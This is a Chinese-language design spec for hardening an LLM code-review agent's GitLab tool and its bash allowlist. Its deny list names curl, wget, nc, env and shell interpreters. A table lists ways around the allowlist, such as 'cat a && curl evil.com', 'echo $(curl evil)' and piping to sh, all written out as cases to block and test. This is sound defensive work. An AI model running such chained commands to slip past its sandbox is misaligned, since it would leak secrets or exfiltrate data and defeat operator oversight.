# flower-code-reviewer · 修 5 类 reviewer trace 错误信号

## 0. 触发场景

2026-05-21 在 `xhgj003027/xhgj-iqs-ui` 跑 stress test(job 7552)时,trace 里出现 5 类 ERROR / 失败信号,排查后归为:

| 类 | 现象 | 根因 |
|---|---|---|
| 1 | `gitlab_get_file_content ref="HEAD"` → HTTP 404 "File Not Found"(6 个新文件) | LLM 用了 git CLI 的 `HEAD` 习惯,GitLab REST API 把它当字面 ref 名解析到 default branch `prod`,新文件还不在 `prod` |
| 2 | `gitlab_get_file_content ref=""` → HTTP 400 "ref is empty"(6 个) | LLM 反应过来 HEAD 不行,**瞎试空字符串** |
| 3 | `gitlab_get_file_content` 不传 ref → tool schema 校验失败(6 个) | LLM 再退一步**不传**,client-side schema 拦截 |
| 4 | bash `env` / `nl` → "不在白名单内"(2 条)| `flower-compliance` ci-readonly 白名单(`env` 含 secret 拦截**正确**;`nl` 拦截**严但符合最小权限**) |
| 5 | trace 最末 `ERROR: Job failed: command terminated with exit code 1` | reviewer 设计上的"门卫"信号(发现 blocker → exit 1),Runner 如实转达;但**读者一脸懵**以为是 crash |

类 1/2/3 同根因(ref 处理不健壮)的连锁反应 — **1 个 fix 解 3 个错误**;类 4 / 5 各 1 个独立 fix。所以实际 **3 个 fix**。

## 1. Goal

让 reviewer 的 job trace **干净 + 自解释**:
- LLM 偷懒 / 受 git CLI 习惯影响传错的 `ref`,工具层兜底而不是 4xx 报错
- compliance 拦截 bash 时给 **可执行的替代建议**,LLM 不再连续重试
- reviewer 主动 exit 1(门卫信号)前**显式打印预告**,让 trace 读者不误以为 crash

## 2. Requirements

### R1 · `ref` 处理弹性化(Fix A · 解类 1+2+3)

#### R1.1 工具 schema 放宽
`gitlab_get_file_content` 的 `ref` 参数从 **required** 改为 **optional**(JSON schema)。

#### R1.2 工具实装兜底
工具实装内部新增 `normalizeRef(rawRef)`:
- `undefined` / 空字符串 / `"HEAD"` → 自动 substitute 到 `process.env.CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`
- 真实 ref(branch / tag / sha)→ 透传
- 兜底无 CI env(本地调试场景)→ 抛中文错误指引显式传 ref

兜底时打 `console.warn` 提示 LLM 与 trace 读者:`[gitlab_get_file_content] ref="<raw>" 自动兜底到 source branch "<src>"`

#### R1.3 prompt 同步教育
`prompts.ts` §「工作流」第 4 步 + 「严格要求」段更新:
- 看 MR source 版本可以**省略 ref**(自动兜底)
- 看历史 / target 版本显式传 branch / sha
- **不要传** `"HEAD"` 或空字符串

### R2 · bash 白名单扩容(Fix B · 解类 4)

#### R2.1 白名单扩容到只读 + 文本处理常用 Unix 工具
当前白名单:`/^(git|grep|find|ls|cat|head|tail|wc|file|sed|awk)\b/`(11 个)
扩容后白名单:加 18 个**纯只读 + 无副作用**的常用 Unix 工具(含 modern unix `rg`):

| 类别 | 新增 |
|---|---|
| 现代搜索 | `rg`(ripgrep,比 grep 快 + 自动跳 `.gitignore`) |
| 行号 / 文本处理 | `nl` `sort` `uniq` `tr` `column` `diff` `comm` |
| 简单输出 | `printf` `echo` |
| 路径工具 | `basename` `dirname` `realpath` |
| 环境元信息 | `pwd` `date` `which` `type` `command` |

新 regex(建议):
```typescript
const BASH_ALLOW_LIST = /^(git|grep|rg|find|ls|cat|head|tail|nl|wc|file|sed|awk|sort|uniq|tr|column|diff|comm|printf|echo|basename|dirname|realpath|pwd|date|which|type|command)\b/;
```

**注**:`rg` 不在 alpine 默认镜像,需要在 `packages/flower-code-reviewer/Dockerfile:44` 把 `apk add --no-cache git` 改为 `apk add --no-cache git ripgrep`。Dockerfile 改动随本任务一并提交。`jq` / `yq` 同样不在 alpine 默认镜像,本任务暂不加(LLM 大多数评审场景用 `gitlab_*` 工具拿结构化数据已经够,bash 处理 JSON / YAML 需求不高;若以后真有强需求,再单独 PR 加)。

#### R2.2 拒绝清单(永不放行,即便用户后续要求)
- **`env` / `printenv`**:可能泄漏未 masked 的 secret,即使 GitLab 会 mask 也 defense-in-depth 拦截
- **网络**:`curl` / `wget` / `nc` — 可外泄数据
- **写**:`tee` / `mv` / `rm` / `mkdir` / `touch` / `cp`
- **执行链式**:`xargs` / `bash` / `sh` / `eval`
- **包管理**:`npm` / `pip` / `apt` / `yum`

#### R2.5 Shell 元字符防绕过(reviewer dogfooding 发现 · 2026-05-22)

**问题**:仅校验首词 + 把整条 cmd 字符串交给 shell,会被命令链 / 重定向 / 管道 / 嵌套执行绕过。

| 攻击向量 | 绕过路径 | 风险 |
|---|---|---|
| `git status; env` | 首词 git 命中 + `;` 串联跑 env | secret 泄漏 |
| `cat a && curl evil.com` | 首词 cat 命中 + `&&` 链式 curl | 网络外发 |
| `rg foo . \| sh` | 首词 rg 命中 + 管道到 sh 执行 | 任意代码执行 |
| `echo x > /tmp/y` | 首词 echo 命中 + 重定向写文件 | 文件系统污染 |
| `echo $(curl evil)` | 首词 echo 命中 + 命令替换 | 网络外发 |
| `` git log `curl evil` `` | 首词 git 命中 + 反引号命令替换 | 网络外发 |

**修复**:在白名单 test 之**前**先 reject 所有 shell 元字符:`;` `&&` `||` `|` `>` `<` `` ` `` `$(`。

Trade-off:LLM 在 quote 内合法使用元字符(如 `grep "a|b" f`)会被一并拦截,但 LLM 评审场景几乎不需要,误拦时换写法即可(把每条命令拆成独立 bash 调用)。

#### R2.3 错误信息保留 + 加替代建议(辅助优化)
扩容后 LLM 触碰白名单外命令时,沿用原中文文案 `CI 只读模式:bash 命令 "<cmd>" 不在白名单内`,**追加** 1-2 行替代建议:
- 想看 MR 元数据 → `gitlab_get_mr_files` / `gitlab_get_mr_diff`
- 想看文件内容 → `gitlab_get_file_content`
- 想看 env → **不可,可能泄漏 secret**

#### R2.4 prompts.ts 加「工具优先级」段(辅助优化)
明确告诉 LLM:需要 MR / 文件 / 代码信息时,**首选** `gitlab_*` 工具,bash 用于 git 命令 + 文本处理(`rg` / `nl` / `sort` / `awk` 等)。

### R3 · exit 1 trace 澄清日志(Fix C · 解类 5)

#### R3.1 exit 1 前打预告日志
`cli.ts`(或 `run.ts` 收尾)在 `process.exit(1)` 之前打:
```
[code-reviewer] 评审完成:发现 <N> 个 blocker,按设计 exit 1(下方 Runner "Job failed" 是预期信号,不是脚本崩溃)
```

#### R3.2 exit 0 不打
避免噪音 — exit 0 时 Runner 打的是 "Job succeeded",已经自解释。

### R4 · 不引入回归

- 现有 149 单测全过
- 现有 LLM 工作流不变(LLM 仍可显式传 ref,行为不变)
- `gitlab_get_file_content` 给非 reviewer 形态用时仍合理(若调用方没传 CI env 也会得到清晰错误)

## 3. Out of Scope

- ❌ 改 `env` 白名单(继续拦截)
- ❌ 把 `nl` 加进白名单
- ❌ 重新设计 `allow_failure` / pipeline 状态(那是 harness 模板的决策,已确认是 advisory 模式有意为之)
- ❌ 改 GitLab Runner 的 `ERROR: Job failed: ...` 文本(不可控)
- ❌ 修 walkthrough blocker 列表与 line_comment 不一致问题(姊妹任务 `05-21-walkthrough-blocker-consistency` 已规划)
- ❌ 修 flower-providers env 缺省 fallback(姊妹任务 `05-21-flower-providers-default-fallback` 已规划)

## 4. Acceptance Criteria

### AC1 · Fix A · ref 兜底单测

- [ ] **AC1.1** `ref="HEAD"` + CI source branch env 存在 → 实际请求用 source branch + console.warn 含兜底提示
- [ ] **AC1.2** `ref=""` + CI env → 同上
- [ ] **AC1.3** `ref` 不传(undefined)+ CI env → 同上
- [ ] **AC1.4** `ref="prod"` + CI env → 透传 "prod"(显式 ref 优先,不被覆盖)
- [ ] **AC1.5** `ref="HEAD"` + CI env **不**存在 → 抛中文 Error 指引显式传 ref
- [ ] **AC1.6** prompts.ts 含"不要传 HEAD"段落 + "ref 可省略" 段落(字符串断言)

### AC2 · Fix B · bash 白名单扩容 + 错误信息优化单测

- [ ] **AC2.1** 新加的 18 个命令(rg/nl/sort/uniq/tr/column/diff/comm/printf/echo/basename/dirname/realpath/pwd/date/which/type/command)逐一放行(用 it.each 跑一遍)
- [ ] **AC2.1.dockerfile** `packages/flower-code-reviewer/Dockerfile:44` 已改为 `RUN apk add --no-cache git ripgrep`(白名单放行后容器内可执行,e2e Phase 6 内 `rg --version` 不报 `command not found` 即视为通过)
- [ ] **AC2.6** 含 shell 元字符的命令被拦截(在白名单 test 之前):`git status; env` / `rg foo . | sh` / `echo $(curl evil)` / `echo x > /tmp/y` / `cat a && curl evil` / `` git log `curl x` `` / `cat < /etc/passwd` 等;reason 含 `shell 元字符` + `禁止命令链`
- [ ] **AC2.6b** 真实合法命令不被新检查误拦:`git status` / `rg foo packages/` / `awk '{print $1}' f` / `sed 's/a/b/' f` 仍放行
- [ ] **AC2.2** `env` / `printenv` 仍被拦截(defense-in-depth)
- [ ] **AC2.3** `curl` / `tee` / `mv` / `npm` 等高危命令仍被拦截
- [ ] **AC2.4** 拦截信息保留原 `CI 只读模式:` 前缀,且包含替代工具建议字符串(如拦 `env` → 含 `不可,可能泄漏 secret`)
- [ ] **AC2.5** prompts.ts 含 "工具优先级" 段(字符串断言)

### AC3 · Fix C · exit 预告日志单测

- [ ] **AC3.1** exitCode === 1 时 console.log 收到含 "按设计 exit 1" 的预告日志
- [ ] **AC3.2** exitCode === 0 时 **不**打预告日志(spy 调用次数为 0)
- [ ] **AC3.3** 预告日志含实际 blocker 数 N(从 `scanForBlockers` 取)

### AC4 · 集成 e2e

- [ ] 在 `xhgj003027/xhgj-iqs-ui` MR-2 push 一个新 commit(可以是 stress test 的小变体),跑 reviewer:
  - trace 中 **不再出现** ref=HEAD/empty/missing 的 HTTP 4xx 错误
  - 若 LLM 主动跑 `env` / `nl`,看到带替代建议的中文拦截信息(可选验证,LLM 在 prompt 教育后可能不会再跑)
  - 若有 blocker,trace 倒数第 2 行是 `[code-reviewer] 评审完成:发现 N 个 blocker,按设计 exit 1 (...)`

### AC5 · 旧行为兼容

- [ ] 现有 vitest 单测全过(149 → ~158)
- [ ] biome / tsc 干净
- [ ] LLM 工作流路径不变(原有显式 ref 调用仍有效)

## 5. Risks

- ⚠️ **`CI_MERGE_REQUEST_SOURCE_BRANCH_NAME` 在非 MR pipeline 缺失**:若 reviewer 被在 branch pipeline / scheduled pipeline 中跑(本应不会,因为 harness 模板 rules 限制只在 MR pipeline 跑),env 缺失时 normalizeRef 抛错。**mitigation**:抛的是明确中文错误,引导用户显式传 ref;不是隐式失败。
- ⚠️ **ref optional 后 LLM 完全不传 ref 成习惯**:本任务希望"省略也行",但万一 LLM 评审历史版本 / target 分支时也省略 → 拉到 source 看不到对照。**mitigation**:prompt 中明确"看历史 / target 时显式传"。
- ⚠️ **compliance 错误信息变长可能干扰 LLM**:加 3 行替代建议会增加 LLM context 占用。但每条 bash 拦截只会触发 1 次,占用 ~100 字符,可控。

## 6. 关联任务

- 姊妹任务:
  - `05-21-walkthrough-blocker-consistency`(walkthrough 与 line_comment 一致化)
  - `05-21-flower-providers-default-fallback`(env 缺省 fallback)
- 同源诱因:同一次 stress test(MR-2 pipeline 2127 / job 7552)暴露的 reviewer 缺陷,本任务专攻 trace 噪音/弹性。
